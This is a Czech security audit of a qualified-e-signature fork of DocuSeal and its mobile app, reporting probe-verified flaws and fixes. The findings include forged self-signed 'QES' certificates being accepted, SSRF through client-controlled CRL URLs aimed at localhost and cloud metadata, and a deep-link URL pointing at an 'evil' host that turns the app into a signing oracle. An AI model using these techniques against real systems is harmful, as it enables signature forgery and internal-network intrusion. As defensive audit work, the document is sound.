# 14 — Audit bezpečnosti, kompletnosti a kvality kódu

Datum: 2026-10-17
Metoda: čtení kódu forku (`vendor/docuseal`, větev `dokulachtan`, base `3c65b0e`), mobilní appky
(`mobile/app`), testů (`spec/**`, `mobile/app/__tests__`), reportů (`test/out/*`), plus **čtyři spuštěné
probe testy** proti forku (PROBE A–D) a pyHanko/asn1crypto analýza výsledných PDF.
Nic v repu se nemodifikovalo (probe spec byl smazán, `git status` čistý).

**Verdikt ve zkratce**

| Otázka | Odpověď |
|---|---|
| Splňuje řešení DESIGN.md? | **Ne v bezpečnostně kritických bodech.** Architektura a tok odpovídají, ale dvě závazná pravidla (`NESMÍ completed bez validation_report.ok`, „AdES se nikdy nesmí vydávat za QES") jsou v kódu porušena a LTV nefunguje. |
| Je patch minimální a udržovatelný? | **Strukturně ano** (logika izolovaná v `app/lib/qes/**`, upstream hunky malé, historie lineární) — ale **není doložený**: SPEC § 7.7/§ 14 tabulky nesedí na realitu a 6 upstream souborů v nich chybí. |
| Vysoké bezpečnostní standardy? | **Ne.** Nalezeny 4 kritické/vysoké závady na serveru (přijetí podvrženého „QES" certifikátu, SSRF, rozbité LTV, chybějící trust check) a 3 v appce (signing oracle, debug podpis, test klíče v release buildu). |
| Neuniká certifikát z appky? | **Soukromý klíč neuniká** (ověřeno), ale **token, podpis a kontrola nad tím, co se podepisuje, unikají** přes parametr `?server=` v deep linku — appka se dá zneužít jako podpisový oracle. Navíc release APK obsahuje testovací privátní klíče. |

Legenda: ❌ kritické/vysoké · ⚠️ střední · ℹ️ nízké/dokumentační

---

## 1. Kritické nálezy

### K1 ❌ Server zapíše podpis jako QES i z nepodepsaného (self-signed) certifikátu

**Soubor:** `app/lib/qes/providers/mobile_app.rb:106`

```ruby
unless report[:intact] && report[:coverage] == 'full'
  raise ClientError.new(:validation_failed, 'Signature validation failed')
end
```

`Qes::Validator.call` počítá správně `report[:ok]`, které **obsahuje i `trusted`**
(`app/lib/qes/validator.rb:21–27`), ale `complete!` kontroluje jen `intact` a `coverage`.
Důsledek: podpis, který je kryptograficky v pořádku, ale **neprochází řetězcem k trust rootu**,
se uloží, session přejde do `completed`, hodnota pole se zapíše a do auditu se zapíše `level = qes`.

**Důkaz (PROBE A, spuštěno v test image):**

```
PROBE A: state=completed level=qes trusted=false ok=false intact=true coverage=full
PROBE A: trust_roots=/qes-test/certs/pki/root.crt subject=/C=CZ/O=Evil/CN=Self Signed QES
```

PROBE A2 přes HTTP: `POST /qes/sessions/:token/certificate` s tímto certifikátem → **200** +
`data_to_sign`, `level=qes`. Tedy kdokoli s platným tokenem (i sám podepisující) si vyrobí self-signed
certifikát s podvrženými `QcCompliance` + `QcSSCD`, nastaví `key_location=card` a server mu vystaví
„kvalifikovaný" podpis.

**Porušuje:** SPEC § 4.3 („NESMÍ nastat `completed` bez `validation_report.ok == true`"),
SPEC § 8.2 („AdES se NIKDY nesmí vydávat za QES"), DESIGN § 9.
**Oprava:** v `complete!` vyžadovat `report[:ok]`; trust chain ověřit **už při `POST /certificate`**
(viz K2) a odmítnout `422 not_trusted`. Přidat negativní test (self-signed QcSSCD cert → 422).

### K2 ❌ `Validator.trusted?` neumí řetěz s intermediate CA → false negatives pro reálné certifikáty

**Soubor:** `app/lib/qes/validator.rb:93–102`

```ruby
store = OpenSSL::X509::Store.new
store.purpose = OpenSSL::X509::PURPOSE_SMIME_SIGN
trust_roots.each { |cert| store.add_cert(cert) }
store.verify(signer_cert)      # intermediate chybí!
```

Do store se přidají jen trust rooty; **intermediate certifikáty z CMS se nikdy nepřidají**, takže
`X509_STORE_CTX` neumí postavit řetěz. To funguje jen pro test PKI (root → leaf přímo).

**Důkaz (PROBE D):**

```
PROBE D: root self trusted=false
PROBE D: intermediate trusted=false
PROBE D: leaf-under-intermediate trusted=false
PROBE D: leaf with intermediate in store trusted=true   # kontrolní OpenSSL test
```

Reálné kvalifikované certifikáty (I.CA, PostSignum) mají intermediate CA → `trusted` bude vždy `false`.
Kvůli K1 se session přesto dokončí, ale `validation_report.trusted=false` jde do auditu a UI
(`_qes_summary.html.erb`) ukáže podpis jako nedůvěryhodný. Po opravě K1 by se navíc **legitimní podpisy
začaly odmítat**.

**Oprava:** `trusted?` musí dostat celý řetěz (`certificates` z CMS) a přidat intermediates do store
(`store.add_cert`) — a stejnou kontrolu dělat při přijetí certifikátu, ne až po podpisu.

### K3 ❌ SSRF: server stahuje CRL z URL, kterou dodá klient v certifikátu

**Soubor:** `app/lib/qes/ltv.rb:75–97` (`fetch_crl`) + `ltv.rb:63–72` (`collect_crls`)

Kontroluje se jen schéma `http`/`https`; žádný allowlist hostů, žádné blokování privátních/loopback/
link-local rozsahů. Certifikát je plně v režii klienta (viz K1) a `Ltv.check_revoked!` se volá
v `data_to_sign` (`mobile_app.rb:36`), tedy dřív, než je cokoli ověřené.

**Důkaz (PROBE B):** certifikát s CRL DP přepsanou na `127.0.0.1:8799` → server poslal
`GET /root.crl` na tuto adresu:

```
PROBE B: server saw requests=["GET /root.crl HTTP/1.1\r\n"]
```

Na Fly.io je z kontejneru dosažitelné metadata `169.254.169.254`, interní služby i `localhost:3000`.
Útočník s tokenem tak může dělat libovolné GETy jménem serveru (čtení interních odpovědí je omezené,
ale DoS a průnik do interní sítě je reálný).

**Oprava:** allowlist hostů pro CRL/OCSP (nebo jen porty z konfigurace), zákaz privátních rozsahů
a `http`, timeout, a **řetěz ověřit před jakýmkoli fetch** (K2). Do SPEC doplnit jako bezpečnostní pravidlo.

### K4 ❌ LTV je rozbité: CRL se vkládají pod špatný ASN.1 tag, pyHanko je nepřečte

**Soubor:** `app/lib/qes/ltv.rb:29–32`

```ruby
values = crls.map { |crl| OpenSSL::ASN1.decode(crl.to_der) }
tagged = OpenSSL::ASN1::ASN1Data.new(values, 0, :CONTEXT_SPECIFIC)   # [0] = ocspVals!
OpenSSL::ASN1::Sequence.new([tagged]).to_der
```

`RevocationValues` (RFC 5126/ETSI) má `ocspVals [0]`, **`crlVals [1]`**, `otherRevVals [2]`.
CRL se tedy vkládají pod `[0]`, kde validátor čeká `OCSPResponse`.

**Důkaz (PROBE C):** `outer=Sequence children=[["ASN1Data", 0]]` — jediný potomek je tag `[0]`.

**Důkaz (pyHanko/asn1crypto na `test/out/qes-signed.pdf`):**

```
unsigned attrs: ['1.2.840.113549.1.9.16.2.24']
ValueError: Unknown element - context class, constructed method, tag 0
  while parsing asn1crypto.core.Sequence
```

a `pyhanko sign validate` na témže PDF hlásí
`INTACT:UNTRUSTED` s „no revocation information could be found for the end-entity certificate".

Tedy **long-term validation nefunguje**: po vypršení/revokaci certifikátu nepůjde podpis ověřit offline,
což je přesně účel LTV a požadavek SPEC § 7.4 („MUSÍ platit: offline validace … trusted=True").
Navíc je implementováno jen CRL, ačkoli SPEC § 7.4 chce „OCSP (primárně) nebo CRL";
konstanty `OCSP_OID`/`CA_ISSUERS_OID` jsou mrtvý kód (`ltv.rb:13–14`).

**Oprava:** správně `crlVals [1]`, ideálně OCSP `[0]` + CRL `[1]`; test, který **offline** (bez
CRL serveru) ověří `trusted=True`, a kontrola v `make qes-e2e`, že pyHanko označí INTACT **i TRUSTED**
(dnes test kontroluje jen `INTACT`, `scripts/qes_e2e.py:335–337`).

---

## 2. Vysoké nálezy

### K5 ⚠️ `EmbedSignatureJob` nemá idempotenci ani retry, `complete!` nemá zámek

SPEC § 7.8 **MUSÍ**: klíč `qes_embed:<session_id>` přes `LockEvent`, max 3 pokusy.
`app/jobs/qes/embed_signature_job.rb` obsahuje jen `return if session.state == 'completed'`,
žádný `LockEvent`, žádné `sidekiq_retries_exhausted`. `Qes::SessionManager.transition!` dělá
`session.save!` bez `with_lock`, `complete!` nemá optimistic lock → dvě souběžná `POST /complete`
projdou kontrolou stavu, obě vygenerují CMS a druhá přepíše `signed_document`/`final_document` i hodnotu
pole. Jde o nahrazení podpisu (signature substitution) a porušení SPEC § 7.10.

### K6 ⚠️ Opakované `POST /complete` s **jinou** signaturou vrací 200 místo 409

`app/controllers/qes/sessions_controller.rb:77` — `return render json: completed_payload if @session.state == 'completed'`
ještě před porovnáním signatury. SPEC § 7.10 chce `409 wrong_state`. Klient tak nikdy nezjistí,
že jeho signatura nebyla použita.

### K7 ⚠️ Chybí část SPEC kontraktu a failure kódů

| SPEC | Stav |
|---|---|
| § 5.3 `202` + `poll_after_ms` při běžícím TSA/LTV | **není** — `complete` volá `EmbedSignatureJob.new.perform` synchronně (`sessions_controller.rb:83`) |
| § 5.6 `incomplete_coverage` | **není** — vždy `validation_failed` (`mobile_app.rb:107`) |
| § 5.6 `prepare_failed` | **není** — chyba v `prepare` proletí jako 500 (`form_sessions_controller.rb:42–50` nerescuuje nic) |
| § 5.6 `session_not_active` | **nikde se nevrací** |
| § 5.6 `signature_size` | vrací se `signature_size_exceeded` (`embed.rb:17`) |
| § 7.8 `tsa_unavailable`, `QES_TSA_REQUIRED` | `Qes::Config[:tsa_required]` se **nikde nečte** (mrtvá konfigurace) |
| § 7.4 LTV přes OCSP | jen CRL (viz K4) |
| § 6.5 krok MUSÍ být poslední ve formuláři | nikde vynuceno |
| § 5.7 kontrola `X-QES-Protocol` v appce | appka hlavičku nečte (`api.ts`) |
| § 9.5 mazání certifikátu s biometrií | nevyžaduje se (viz M4) |
| § 6.6 statické `public/.well-known/assetlinks.json` | soubor neexistuje, servíruje se dynamicky |
| § 9.7 `src/modules/eop-signing-sdk` (MOI AAR) | **neexistuje**, varianta A je jen stub |
| § 6.4 odkazy na stažení appky ve web fallbacku | v `qes/app/show.html.erb` nejsou |

### K8 ⚠️ `GET /qes/sessions/:token` vrací 410 u dokončené session po expiraci

`app/controllers/qes/sessions_controller.rb:20` kontroluje `expired?` před větví pro `completed` (ř. 21).
Dokončená session má `expires_at` v minulosti → appka po chybě sítě dostane `expired_token` a zobrazí
„Vyžádejte nový odkaz", i když je podpis hotový (SPEC § 7.10 chce skutečný stav).

---

## 3. Mobilní aplikace

### M1 ❌ Parametr `?server=` v deep linku = podpisový oracle

`mobile/app/app/sign.tsx:37,45`

```tsx
const { token, server } = useLocalSearchParams<{ token?: string; server?: string }>();
const serverUrl = typeof server === 'string' && server.length > 0 ? server : SERVER_URL;
```

`serverUrl` se použije pro **všechny tři** volání (`GET`, `POST /certificate`, `POST /complete`).
`session.server_url` z payloadu se **nikde nepoužívá** (jen v typu `types.ts:15`). DESIGN § 8.1 i SPEC § 10.3
přitom říkají opak: „Server URL se bere z odpovědi API (`server_url`), ne z parametru v linku";
SPEC § 16 #9 dokonce parametr `?s=` výslovně odstranil.

**Útok:** `dokulachtan://sign?token=x&server=https://evil` (custom scheme je registrovaná bez verifikace;
App Links navíc kvůli M2 nefungují). Appka:
1. pošle token na `evil` (`api.ts:70`),
2. zobrazí jméno dokumentu a otisk z `evil`,
3. vyžádá **skutečnou** biometrii,
4. podepíše `data_to_sign` z `evil` **privátním klíčem uživatele** (`ceremony.ts:104–105`),
5. pošle raw signaturu na `evil`.

Útočník získá platný podpis uživatelova **státem vydaného certifikátu** nad libovolným obsahem
(CMS podepsané atributy si volí sám). UI přitom neukazuje, na který server se odesílá.

**Oprava:** parametr `server` ignorovat; první `GET` na nakonfigurovaný server
(`EXPO_PUBLIC_API_URL`); další volání jen na `payload.server_url`, a to pouze pokud se rovná
nakonfigurovanému hostu (nebo projde allowlistem); v UI zobrazit host. Test na to chybí.

### M2 ✅ Release APK se podepisuje vlastním keystorem (2026-10-27)

**Původní stav:** `mobile/app/android/app/build.gradle:115` → `release { signingConfig signingConfigs.debug }`.
Ověřeno z distribuovaného APK (`deploy/apk/dokulachtan-signer.apk`): podepsán
`CN=Android Debug` s SHA-256 `FA:C6:17:45:DC:09:03:78:…:9C` (veřejný debug klíč, heslo `android`).
Staging publikoval `sha256_cert_fingerprints: ["48b1810c40e8dfefa011c23fb1fa4af85b199624d623e003b8d48f056fadd8ed"]`
(`curl https://dokulachtan.fly.dev/.well-known/assetlinks.json`) → **nesouhlasí**.

**Oprava:** `deploy/android-release/` drží privátní release keystore (gitignored) a
`mobile/app/plugins/withReleaseSigning.js` při `expo prebuild` přidá `signingConfigs.release`;
release build použije release config jen když je `ANDROID_KEYSTORE_PATH` nastavená, jinak zůstává
debug pro lokální build. CI `.github/workflows/android-release.yml` dekóduje
`ANDROID_KEYSTORE_BASE64`, předá hesla a po buildu ověří APK proti
`ANDROID_RELEASE_CERT_SHA256`; když otisk nesedí, release nevytvoří.

Release certifikát má SHA-256
`80:DC:86:EF:10:A7:15:96:1A:CF:49:59:D1:1F:56:C9:44:A9:14:76:A3:99:55:8D:E1:7C:13:89:59:5E:C3:E0`.
Na stagingu i produkci je potřeba nastavit `QES_ANDROID_CERT_SHA256` na tento otisk.
Testovací APK na `dokulachtan-download.fly.dev` zůstává debug (samostatný účel).
Stávající debug instalace vyžadují reinstalaci a nový import `.p12` — jiný podpis nejde
aktualizovat.

Důsledky původního stavu:
1. App Links (autoVerify) pro distribuovaný APK **nefungovaly** — primární `https://…/qes/sign` se neotevřel,
   reálně se používal neověřený custom scheme, který mohl zaregistrovat i cizí appka a token převzít.
2. Kdokoli mohl sestavit APK se stejným package name a debug podpisem, který Android přijal jako
   update nainstalované appky (přístup k SecureStore/Keystore vaultu).

### M3 ❌ Testovací privátní klíče jsou v každém buildu včetně release

`mobile/app/src/lib/testCertificate.ts:7,71` obsahuje PKCS#12 (AdES i QSCD) s heslem `test`;
`cardSigner.ts:72` je používá ve `FakeCardSigner`. V distribuovaném APK ověřeno:

```
unzip -p deploy/apk/dokulachtan-signer.apk assets/index.android.bundle | grep -c "MIIP5gIBAzCCD5wGCSqGSIb3DQEHAaCCD40Egg"
1
```

Nic není gatované `__DEV__` ani build profilem; tlačítka „Importovat testovací certifikát" jsou
v produkčním UI (`import.tsx:41,91`, `settings.tsx:20,41`, `setup.tsx:13,37`, `sign.tsx:94`).
Staging navíc **trustuje test root** (`QES_TRUST_ROOTS=/app/config/qes/root.crt,…`, root.key je
v repu) → kdokoli s APK si vyrobí podpis, který staging ověří. Pro staging akceptovatelné,
pro produkci nutné test klíče z buildu odstranit (samostatný entry / `__DEV__` gate).

### M4 ⚠️ Import, nahrazení i smazání certifikátu bez biometrie

SPEC § 9.5: „Import nového PKCS#12 **nahrazuje** předchozí; **před smazáním se vyžaduje biometrie**"
a § 9.1 S3 „odstranění (s potvrzením + biometrií)".
`vault.ts:143–190` (`importCertificate`) ani `vault.ts:250–253` (`removeCertificate`) biometrii nevyžadují;
`certificate.tsx:20–23` maže bez potvrzení. V kombinaci s K1/K2 může útočník s krátkým fyzickým
přístupem podstrčit vlastní certifikát (stejný subject), uživatel pak podepisuje klíčem útočníka.

### M5 ⚠️ Biometrie má fallback na PIN zařízení a slabou biometrii

`platform.ts:25–31` volá `authenticateAsync({ promptMessage, cancelLabel })` bez
`disableDeviceFallback: true` a bez `biometricsSecurityLevel: 'strong'`. Výchozí hodnoty
`expo-local-authentication` (ověřeno ve zdrojích modulu) povolují `DEVICE_CREDENTIAL` (PIN/heslo zařízení)
na Androidu a `deviceOwnerAuthentication` na iOS, security level je `WEAK` (Class 2).
SPEC § 9.5: „Bez biometrie se nepodepisuje — žádný fallback na heslo ani na PIN appky."

### M6 ⚠️ Appka nevaliduje odpovědi serveru

- `X-QES-Protocol` z odpovědi se nečte (SPEC § 5.7).
- `session.hash_algorithm` se přetypuje (`ceremony.ts:85`) a použije jako klíč do `forge.md[…]`;
  neznámá/hodnota jako `md5` projde (server ji sice posílá jen sha256, ale kompromitovaný server ne).
- `data_to_sign` se podepíše bez kontroly, že jde o DER SET podepsaných atributů, a bez vazby
  na `document_digest`.
- Úspěch se zobrazí z hodnot serveru bez křížové kontroly.

### M7 ⚠️ Vybraný PKCS#12 se kopíruje do cache appky a neuklízí

`import.tsx:30` volá `DocumentPicker.getDocumentAsync` s výchozím `copyToCacheDirectory: true`
(ověřeno v `node_modules/expo-document-picker/build/index.js:14`); appka soubor přečte do paměti,
ale **nesmaže** ho (SPEC § 9.5: „soubor PKCS#12 se po importu smaže"). Navíc `bytes` zůstávají
ve stavu komponenty i po úspěšném importu.

### M8 ℹ️ Klíčový materiál se neuklízí, vault klíč zůstává v paměti

`vault.ts:119–137` drží vault klíč v modulové proměnné po celý život appky; `removeCertificate`
maže jen data, ne klíč z SecureStore. SPEC § 9.3 bod 7 (`key = null`, `p12 = null`) není provedeno;
`ceremony.ts` drží `material.privateKeyPem` v scope do konce obřadu. V JS nejde nulovat řetězce,
ale `material = null` po podpisu je minimum.

### M9 ℹ️ Nastavení serveru je mrtvé UI

`settings.tsx:10` drží `serverUrl` ve stavu, nikam ho neukládá a nikde se nepoužívá — SPEC S7 chce
server URL nastavitelnou. Diagnostika je jen text.

---

## 4. Minimalita patche a udržovatelnost proti upstreamu

**Co je dobré (a je třeba udržet):**

- Veškerá nová logika je v nových souborech `app/lib/qes/**`, `app/controllers/qes/**`,
  `app/jobs/qes/**`, `app/views/qes/**`, `app/models/qes_session.rb`; upstream soubory mají malé hunky.
- Historie je lineární (26 commitů, žádné merge z upstreamu), base je shodný s `docs/08`.
- Nové závislosti: žádné (LTV přes `net/http`, rate limiting přes `Rails.cache`).
- `generate_result_attachments.rb` je upraveno v jednom místě (hook + `page_offsets`), zbytek upstreamu se nemění.

**Co minimalitu kazí:**

| Soubor | Změna | Proč to vadí |
|---|---|---|
| `config/environments/test.rb` | `:null_store` → `:memory_store` | mění chování **celé upstream test sady** kvůli QES rate limitu; SPEC § 5 to sice zdůvodňuje, ale je to zásah do upstreamu, který se může při rebase rozejít |
| `lib/submissions/generate_result_attachments.rb` | +29/−13 (SPEC slibuje 8) | hook, skip qes, `base:`, `page_offsets:`, změna `single_sign_reason` (sort nil `completed_at`) — SPEC tuto změnu neuvádí |
| `app/javascript/submission_form/form.vue`, `area.vue`, `i18n.js` | +78 | SPEC § 7.7 slibuje 6 řádků; `area.vue` a `i18n.js` v tabulce nejsou vůbec |
| `config/locales/i18n.yml` | +188 | SPEC slibuje „jen `en`, ostatní fallback, 2 řádky"; navíc **duplicitní klíč `qes:`** v `en` (ř. 1173 skalár, ř. 1176 hash) — `t('qes')` vrací hash, skalár je mrtvý |
| `app/models/submission.rb`, `submit_form_controller.rb` | +11 / 1 | v SPEC § 7.7 uvedené, ale v § 14 seznamu commitů ne |
| `app/views/submissions/show.html.erb` | +11 | v SPEC § 7.7/§ 14 chybí |
| `tailwind.form.config.js`, `fly.toml`, `config/qes/root.crt` | +37 | v SPEC § 7.7 chybí (u `tailwind` to § 13 přiznává) |

**Zásadní strukturální výhrada:** trust check a LTV jsou implementačně „vložené" do pipeline tak, že
**selhávají otevřeně** (K1, K3, K10). Oprava K1/K2 si vyžádá zásah do `mobile_app.rb` a `validator.rb`,
tedy do souborů, které jsou jádrem forku — to je v pořádku, ale musí to být pokryté testy, jinak se při
rebase na novější HexaPDF/DocuSeal tiše vrátí.

**Doporučení:** aktualizovat SPEC § 7.7/§ 14/§ 15.1/§ 18 podle skutečnosti (nebo kód přiblížit tabulkám),
sjednotit commit granularitu, doplnit chybějící soubory a počty řádků. Tabulka, která neodpovídá realitě,
je horší než žádná — při rebase se podle ní nedá postupovat.

---

## 5. Dokumentace vs. realita (výběr)

| Dokument | Tvrzení | Realita |
|---|---|---|
| AGENTS.md:56,156 | SQLite 243/1, Postgres 247/0 | SQLite **306/1** (změřeno 2026-10-17), Postgres report z 10-16 (před P7 specy) |
| AGENTS.md:185 | „appka je cross-platform bez `Platform.OS` větví kromě metadat" | `index.tsx:77` má druhou větev (skrytí čtečky na iOS) |
| AGENTS.md:169 | „P6 — zbývá jen provozní dokumentace" | runbook `docs/10` hotový, P7 doděláno; status je stale |
| docs/13:145,160 | `make qes-test-qes` 56/0, `make qes-test` 299/1 | **59/0**, **306/1** |
| docs/13:128 | `Qes::Validator/Ltv/CmsBuilder/Seal` beze změny | `a364101c`, `0694b336` je změnily |
| docs/13:112, SPEC §15.2 | první revize zůstávají `UNTOUCHED` | pyHanko: `EXTENDED_WITH_OTHER,ILLEGAL_MODIFICATIONS` (nové podpisové pole v AcroForm) |
| docs/10:4 | „Vše níže je změřené, ne odhad" | `make qes-e2e-card` report v `test/out/` není; staging reporty ukazují `UNTRUSTED`, ne `TRUSTED` |
| FORK.md | `qes_single_signer_only`, `public/.well-known/assetlinks.json`, `docs/qes.md`, `yarn` | nic z toho neexistuje / nepoužívá se |

Poznámka k `ILLEGAL_MODIFICATIONS`: u vícenásobných podpisů pyHanko označí **dřívější** podpisy appky
jako `EXTENDED_WITH_OTHER,ILLEGAL_MODIFICATIONS`, protože každá další session přidává nové podpisové pole
do AcroForm. Kryptograficky jsou INTACT (což je splněno), ale striktní validační politika to může hodnotit jako
nedovolenou modifikaci. Do SPEC patří rozhodnutí, zda to řešit (předvytvoření všech polí v první revizi), nebo
akceptovat s vysvětlením.

---

## 6. Co naopak funguje (ověřeno)

- Kryptografický řetěz TBS → podepsané atributy → raw signatura → CMS → PAdES → validace → pečeť
  funguje pro test PKI; `make qes-test-qes` **59/0**, mobilní testy **34/34**, celá SQLite sada **306/1**
  (stejný upstream flake `signing_form_spec.rb:1253`).
- Vícenásobné podpisy: druhý TBS začíná přesně prvním finálním PDF (`chain_spec.rb`), stejná osoba
  se řetězí na vlastní revizi, `page_offsets` pro víc příloh funguje.
- Soukromý klíč **neopouští** zařízení: do serveru jde jen certifikát + řetěz a raw signatura; vault
  AES-256-GCM s náhodným IV/tagem, heslo k PKCS#12 se neukládá, v appce nejsou `console.*`/analytika.
- Token: 43 znaků, v DB jen sha256, TTL, jednorázové použití, rate limiting, `Referrer-Policy`.
- Android backup pravidla vylučují SecureStore z cloudu (ověřeno v APK resources).
- Bezpečnostní kontroly, které v kódu **jsou**: `key_location × QcSSCD`, `level_required`, keyUsage,
  platnost certifikátu, minimální RSA 2048, `signing_context_mismatch` (byte-identical), `signature_invalid`,
  kontrola `signature_size_exceeded`, `ValueValidator` proti obejití povinného pole.

---

## 7. Doporučený plán oprav (priorita)

1. **K1** — vyžadovat `report[:ok]` v `complete!` + trust chain při `POST /certificate`; negativní test
   (self-signed QcSSCD → 422).
2. **K2** — `trusted?` s celým řetězem (intermediates do store); test s 3úrovňovým řetězem.
3. **K3** — allowlist pro CRL/OCSP hosty, zákaz privátních IP a `http`, timeout; test na SSRF.
4. **K4** — opravit ASN.1 `crlVals [1]` (+ OCSP `[0]`); offline test `trusted=True`; `make qes-e2e`
   rozšířit na kontrolu `TRUSTED`.
5. **M1** — odstranit `server` z deep linku, použít `server_url` z payloadu + allowlist; test.
6. **M2** — ✅ release keystore v `deploy/android-release/` + CI secrets; zbývá nastavit
   `QES_ANDROID_CERT_SHA256` na stagingu/produkci a počítat s reinstalací stávajících debug instalací.
7. **M3** — testovací PKCS#12 jen v dev buildu; odstranit tlačítka z produkčního UI.
8. **K5/K6** — `with_lock` + `LockEvent` + 409 při jiné signatuře.
9. **M4/M5** — biometrie pro import/smazání, `disableDeviceFallback`, `biometricsSecurityLevel: 'strong'`.
10. **K7/K8/M6** — doplnit chybějící stavy (202, failure kódy, `expires` vs `completed`, validace odpovědí).
11. **Dokumentace** — sladit SPEC § 7.7/§ 14/§ 15.1/§ 18, AGENTS.md, docs/10, docs/13, FORK.md se skutečností.

Po opravě K1/K2/K4 je nutné znovu spustit staging e2e — trust check bude poprvé skutečně vynucený.

---

## 8. Stav oprav (2026-10-17)

| Nález | Stav | Změna |
|---|---|---|
| K1 | ✅ opraveno | `complete!` vyžaduje `report[:ok]`; `POST /certificate` ověřuje řetěz k trust rootu (`422 not_trusted`) |
| K2 | ✅ opraveno | `Validator.trusted_chain?` přidává intermediates z CMS do OpenSSL store |
| K3 | ✅ opraveno | `Ltv.validate_url!`: allowlist `QES_LTV_ALLOWED_HOSTS`, jinak https + veřejná adresa, limit odpovědi |
| K4 | ✅ opraveno | ETSI `crlVals [1]`, Adobe `adbe-revocationInfoArchival`, DSS slovník (`Qes::Dss`) |
| K5 | ✅ opraveno | `EmbedSignatureJob` s `LockEvent` (`qes_embed:<id>`, `complete`) a 3 pokusy; `complete!` pod `with_lock` |
| K6 | ✅ opraveno | `POST /complete` s jinou signaturou → `409 wrong_state` (porovnání SHA-256) |

Ověření: `make qes-test-qes` → **76 examples, 0 failures**; LTV offline (CRL server neběží):
pyHanko API s `allow_fetching=False` → `intact=True trusted=True valid=True`; pyHanko CLI s DSS →
`EXTENDED_WITH_LTA_UPDATES,ACCEPTABLE_MODIFICATIONS`.

Zbývá (mimo K1–K6, viz nálezy K7–K15, M1–M9): chybějící `202`/`poll_after_ms` a failure kódy
(`incomplete_coverage`, `prepare_failed`, `session_not_active`, `tsa_unavailable`), `OCSP` (nyní jen CRL),
`documents` sdílí blob se session (K9), mobilní nálezy M1–M9.
